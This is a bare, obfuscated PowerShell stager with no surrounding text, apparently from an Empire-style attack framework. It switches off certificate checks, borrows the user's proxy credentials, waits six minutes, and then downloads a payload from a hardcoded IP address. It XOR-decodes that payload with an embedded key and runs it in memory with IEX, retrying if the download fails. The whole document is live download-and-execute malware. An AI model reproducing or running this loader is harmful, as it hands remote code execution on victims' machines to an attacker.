
$wc=NeW-ObJECT SYSteM.NET.WEBCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEadERS.ADd('User-Agent',$u);$Wc.PRoXY = [SysteM.NEt.WeBReQUEst]::DeFaULtWeBPRoxY;$Wc.PrOxY.CRedEnTiaLs = [SySTeM.NeT.CREdENtIALCaChe]::DefaULtNeTwORkCREDEnTIAls;$K='879526880aa49cbc97d52c1088645422';SLEEP 360;$R=5;dO{TrY{$i=0;[CHAR[]]$B=([cHAR[]]($WC.DoWNLOaDSTRINg("https://52.39.227.108:443/index.asp")))|%{$_-bXOr$K[$I++%$k.LEngth]};IEX ($B-JoIn''); $R=0;}catCh{sLeEP 5;$R--}} WhiLE ($R -GT 0)

